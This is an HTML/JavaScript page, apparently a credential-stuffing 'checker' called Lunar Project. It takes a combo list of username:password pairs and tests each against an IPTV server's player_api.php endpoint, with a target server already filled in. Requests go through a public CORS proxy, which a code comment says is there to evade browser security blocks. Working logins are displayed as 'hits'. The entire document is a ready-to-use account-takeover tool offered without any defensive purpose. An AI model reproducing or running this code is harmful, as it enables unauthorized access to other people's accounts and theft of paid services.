<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>🌘 LUNAR PROJECT — BY TUTSUKI 🌘</title>
    <style>
        body { background-color: #050505; color: #00c38e; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin: 0; padding: 20px; }
        .container { border: 2px solid #00c38e; padding: 20px; border-radius: 15px; margin: 0 auto; max-width: 600px; background: rgba(0,0,0,0.9); box-shadow: 0 0 20px rgba(0, 195, 142, 0.2); }
        h1 { text-shadow: 0 0 10px #00c38e; margin-bottom: 25px; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #00c38e; background: #111; color: #00c38e; font-size: 16px; }
        button { width: 95%; padding: 15px; background-color: #00c38e; border: none; border-radius: 8px; cursor: pointer; color: #000; font-weight: bold; font-size: 18px; transition: 0.3s; margin-top: 10px; }
        button:hover { background-color: #008a65; transform: scale(1.02); }
        .stats { margin-top: 20px; padding: 15px; border-top: 1px solid #333; }
        .barra { background: #222; border-radius: 10px; height: 25px; margin: 15px 0; overflow: hidden; border: 1px solid #444; }
        .barra-fill { background: linear-gradient(90deg, #00c38e, #00ffba); height: 100%; width: 0%; transition: width 0.2s; display: flex; align-items: center; justify-content: center; color: #000; font-weight: bold; font-size: 12px; }
        #logs { text-align: left; background: #0a0a0a; border-radius: 8px; padding: 15px; height: 300px; overflow-y: auto; border: 1px solid #222; font-size: 13px; line-height: 1.6; }
        .hit { color: #00ffba; font-weight: bold; border-left: 3px solid #00ffba; padding-left: 10px; margin-bottom: 5px; background: rgba(0, 255, 186, 0.05); }
    </style>
</head>
<body>

<div class="container">
    <h1>🌘 LUNAR PROJECT</h1>
    <p style="margin-top:-20px; font-size: 12px; opacity: 0.7;">BY TUTSUKI</p>
    
    <label>📂 Selecione seu Combo.txt:</label>
    <input id="combo" type="file" accept=".txt"/>
    
    <label>🌐 URL do Servidor (com porta):</label>
    <input id="srv" placeholder="Ex: http://2025easy.lat:80" type="text" value="http://2025easy.lat:80"/>
    
    <label>👤 Seu Nick:</label>
    <input id="nick" value="Tutsuki" type="text"/>
    
    <button onclick="iniciarScan()">🚀 INICIAR SCAN</button>

    <div class="stats">
        <div style="font-size: 20px;">🔥 HITS: <span id="count">0</span></div>
        <div class="barra"><div id="fill" class="barra-fill">0%</div></div>
        <div id="logs">Aguardando início...</div>
    </div>
</div>

<script>
let totalHits = 0;
let stop = false;

async function iniciarScan() {
    const file = document.getElementById('combo').files[0];
    const server = document.getElementById('srv').value;
    const nick = document.getElementById('nick').value;
    const logs = document.getElementById('logs');
    
    if(!file || !server) return alert("Configure o arquivo e o servidor!");

    logs.innerHTML = "✨ Iniciando motores Lunar...";
    const text = await file.text();
    const lines = text.split(/\r?\n/).filter(l => l.includes(':'));
    const total = lines.length;
    
    for(let i = 0; i < total; i++) {
        if(stop) break;
        
        const [user, pass] = lines[i].trim().split(':');
        const percent = Math.floor(((i + 1) / total) * 100);
        
        document.getElementById('fill').style.width = percent + "%";
        document.getElementById('fill').innerText = percent + "%";

        try {
            // Usando Proxy para evitar bloqueio de segurança (CORS) do navegador
            const proxy = "https://corsproxy.io/?";
            const target = `${server}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
            
            const response = await fetch(proxy + encodeURIComponent(target));
            const data = await response.json();

            if(data?.user_info?.status === "Active") {
                totalHits++;
                document.getElementById('count').innerText = totalHits;
                logs.innerHTML = `<div class="hit">✅ HIT [${nick}]: ${user}:${pass}</div>` + logs.innerHTML;
            }
        } catch(e) {
            // Erro de conexão ou usuário inválido
        }
    }
    logs.innerHTML = "<b>🏁 Scan Finalizado!</b><br>" + logs.innerHTML;
}
</script>
</body>
</html>
